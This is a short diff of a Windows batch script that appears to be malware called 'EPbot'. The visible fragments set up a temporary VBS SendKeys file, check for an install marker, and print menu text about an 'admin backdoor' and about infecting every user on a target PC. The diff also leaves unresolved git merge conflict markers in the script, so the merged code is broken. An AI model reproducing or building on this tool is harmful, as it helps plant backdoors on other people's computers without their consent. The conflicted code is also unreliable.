@@ -1,10 +1,15 @@
 :: setup
 :start
 @ECHO OFF
+<<<<<<< HEAD
 < C:\ProgramData\UPnum.sav (
   set /p update_number=
 )
 set dev=1
+=======
+set update_number=4.42.35
+set dev=0
+>>>>>>> parent of 566f9af (updates)
 cls
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
@@ -74,7 +79,6 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
 :EP_finish
 :: manual configuration
   :exit_menu
-  echo [45mversion 5 is being made which will allow for updating the entire program and other new features[0m
   echo [31madmin backdoor needs more testing, use this at your own risk[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
